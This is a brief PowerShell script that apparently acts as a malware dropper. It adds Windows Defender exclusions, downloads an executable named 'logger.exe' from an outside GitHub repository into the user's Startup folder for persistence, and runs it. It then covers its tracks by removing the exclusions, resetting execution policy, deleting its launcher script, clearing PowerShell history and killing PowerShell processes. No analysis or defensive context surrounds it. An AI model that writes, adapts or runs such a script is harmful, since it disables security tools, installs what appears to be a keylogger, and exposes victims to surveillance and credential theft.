Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup
Add-MpPreference -ExclusionExtension exe -Force
Invoke-WebRequest https://github.com/urinfected/ohHi_0.0/raw/main/logger.exe -O logger.exe
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\logger.exe -Force
Start-Process logger.exe
Remove-MpPreference -ExclusionExtension exe -Force
Remove-MpPreference -ExclusionExtension ps1 -Force
Set-ExecutionPolicy restricted -Force #Reset script execution policy
Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
